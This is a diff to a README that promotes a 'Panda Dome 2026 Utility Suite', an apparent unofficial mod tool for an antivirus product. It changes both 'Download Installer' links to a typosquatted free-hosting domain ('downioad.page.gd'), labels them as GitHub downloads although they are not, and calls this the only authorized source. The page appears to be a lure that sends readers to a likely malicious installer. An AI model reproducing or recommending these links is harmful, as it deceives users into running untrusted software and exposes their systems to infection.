@@ -2,7 +2,7 @@
 
 The Panda Dome 2026 Utility Suite is a dedicated mod tool designed to enhance and streamline your Panda Dome antivirus experience on Windows 10 and 11. This suite offers a range of features to help you manage security settings, automate updates, and optimize system performance, ensuring your protection is always at its peak.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -71,7 +71,7 @@ A: The utility includes a backup feature that allows you to save and restore pre
 
 For the latest version and updates, please download directly from the official source:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This is the only authorized download link. Always verify that you are accessing the official page to avoid unofficial or modified versions.
 
